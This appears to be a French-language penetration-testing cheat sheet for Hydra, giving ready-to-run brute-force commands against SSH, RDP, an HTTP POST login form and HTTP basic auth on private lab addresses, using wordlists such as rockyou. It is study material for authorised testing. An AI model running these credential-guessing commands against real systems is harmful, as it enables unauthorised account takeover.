## Hydra
Permet d'utiliser un mot ou une liste de mot pour trouver nom d'utilisateur et/ou le mot de passe pour différent services.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#ssh
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
#rdp
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
#http-post form
#Dernier paramètre: “/chemin:post_request:fail_condition”
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
#basic auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f https-get://192.168.241.201/index.php
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~